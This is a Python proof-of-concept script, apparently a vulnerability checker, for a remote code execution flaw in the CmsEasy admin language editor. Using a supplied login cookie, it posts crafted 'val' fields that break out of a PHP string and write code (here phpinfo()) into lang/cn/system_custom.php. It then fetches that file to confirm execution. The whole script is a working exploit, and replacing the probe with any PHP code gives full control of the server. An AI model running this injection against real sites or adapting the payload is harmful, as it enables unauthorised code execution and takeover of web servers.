import requests
import argparse
from requests.exceptions import RequestException

requests.packages.urllib3.disable_warnings()


def check(target, cookie):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Cookie': f'{cookie}'
    }

    params = {'case': 'language',
              'act': 'add',
              'admin_dir': 'admin',
              'site': 'default',
              'id': '1',
              'lang_choice': 'system_custom.php',
              }

    data = [{'cnnote': '1', 'key': '2', 'val': '3);', 'submit': '1', }, {
        'cnnote': '4', 'key': ',5,', 'val': ',phpinfo());/*', 'submit': '1', }]

    try:
        for d in data:
            resp = requests.post(target+'/index.php', params=params,
                                 headers=headers, data=d, verify=False, timeout=30)
        if resp.status_code == 200 and '操作完成' in resp.text:
            check_resp = requests.get(
                target+'/lang/cn/system_custom.php', headers=headers, verify=False, timeout=30)
            if 'PHP API' in check_resp.text and 'PHP Extension' in check_resp.text:
                print(f'{target} 存在漏洞')
            else:
                print(f'{target} 不存在漏洞')
    except RequestException as e:
        print(e)


def main(args):
    check(args.url, args.cookie)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Check Cmseasy language_admin.php rce")
    parser.add_argument("-u", "--url", help="Test url")
    parser.add_argument("-c", "--cookie", help="Login Cookie")

    args = parser.parse_args()
    main(args)
